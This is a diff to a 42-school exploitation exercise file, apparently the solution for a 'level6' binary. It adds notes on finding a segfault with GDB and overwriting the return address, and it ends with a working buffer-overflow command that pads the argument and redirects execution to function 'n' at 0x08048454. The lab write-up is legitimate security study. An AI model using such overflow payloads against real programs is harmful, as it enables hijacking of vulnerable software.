@@ -6,9 +6,13 @@
 #    By: lgarczyn <lgarczyn@student.42.fr>          +#+  +:+       +#+         #
 #                                                 +#+#+#+#+#+   +#+            #
 #    Created: 2019/05/04 18:52:27 by lgarczyn          #+#    #+#              #
-#    Updated: 2019/05/04 18:52:53 by lgarczyn         ###   ########.fr        #
+#    Updated: 2019/05/04 20:39:28 by lgarczyn         ###   ########.fr        #
 #                                                                              #
 # **************************************************************************** #
+
+We notice a segfault if the first argument is too long
+By looking into the execution with GDB, we notice that we are overwriting the return address
+We change the return address to 'n', or 0x08048454
 
 export F=`echo -e "\x54\x84\x04\x08"`
 ./level6 111111111111111111111111111111111111111111111111111111111111111111111111$F
